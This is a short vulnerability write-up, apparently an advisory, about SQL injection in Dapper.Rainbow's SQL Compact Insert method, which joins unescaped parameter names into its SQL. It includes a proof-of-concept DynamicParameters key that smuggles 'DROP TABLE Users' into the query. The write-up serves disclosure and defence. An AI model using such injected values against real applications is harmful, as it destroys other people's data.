### Vulnerability Analysis

In `Dapper.Rainbow/SqlCompactDatabase.cs`, the `SqlCompactTable.Insert` method overrides the base `Insert` method to support SQL Compact's syntax. However, it continues the same unsafe dynamic SQL compilation practices by joining the output of `GetParamNames(o)` directly into the constructed SQL statement:
```csharp
string cols = string.Join(\",\", paramNames);
string colsParams = string.Join(\",\", paramNames.Select(p => \"@\" + p));

var sql = \"insert \" + TableName + \" (\" + cols + \") values (\" + colsParams + \")\";
```

Because parameter names are not escaped or validated, any user-controlled keys mapped within a `DynamicParameters` argument can be abused to perform SQL injection.

### Conceptual Exploit Payload

An application utilizes dynamic key mappings under a SQL Compact provider:
```csharp
var dynParams = new DynamicParameters();
dynParams.Add(\"colName) values (1); DROP TABLE Users; --\", \"dummyValue\");
db.Users.Insert(dynParams);
```

The resulting executed query is:
```sql
insert Users (colName) values (1); DROP TABLE Users; --) values (@colName) values (1); DROP TABLE Users; --)
```

This injects and executes the `DROP TABLE Users` statement.

